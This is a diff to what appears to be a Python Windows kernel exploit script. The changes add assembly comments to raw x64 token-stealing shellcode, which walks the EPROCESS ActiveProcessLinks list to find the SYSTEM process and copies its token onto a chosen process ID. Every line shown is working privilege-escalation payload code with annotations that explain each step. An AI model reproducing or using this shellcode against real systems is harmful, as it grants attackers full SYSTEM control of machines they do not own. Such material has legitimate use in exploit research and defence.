@@ -95,7 +95,7 @@ def spawnshell():
 def shellcode(pid):
     tokenstealing = (
         "\xCC"
-        "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      # mov r9, [gs:188h]   ;KTHREAD pointer
+        "\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"      # mov r9, [gs:188h]    ;KTHREAD pointer
         "\x4D\x8B\x89\x20\x02\x00\x00"              # mov r9, [r9+220h]    ;EPROCESS pointer
         "\x4D\x8B\x89\xf0\x02\x00\x00"              # mov r9, [r9+2f0h]    ;ActiveProcessLinks list head
         "\x49\x8B\x01"                              # mov rax, [r9]        ;follow link to first process in list
@@ -104,14 +104,14 @@ def shellcode(pid):
         "\x74\x05"                                  # jz found_system      ;YES - move on
         "\x48\x8B\x00"                              # mov rax, [rax]       ;NO - load next entry in list
         "\xEB\xF1"                                  # jmp find_system      ;loop
-        "\x48\x8B\x48\x68"
+        "\x48\x8B\x48\x68"                          # mov rcx, [rax+0x68]  ;offset to token
         "\x80\xE1\xF0"                              # and cl, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
         "\x48\x8B\x50\xF8"                          # mov rdx, [rax-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
         "\x48\x81\xFA" + struct.pack("<I", pid) +   # cmp rdx, ZZZZ        ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
         "\x74\x05"                                  # jz found_cmd         ;YES - move on
         "\x48\x8B\x00"                              # mov rax, [rax]       ;NO - next entry in list
         "\xEB\xEE"                                  # jmp find_cmd         ;loop
-        "\x48\x89\x48\x68"
+        "\x48\x89\x48\x68"                          # mov [rax+0x68], rcx ;copy SYSTEM token over top process's token
         "\xC3")                                     # ret
 
     lpAddress = None
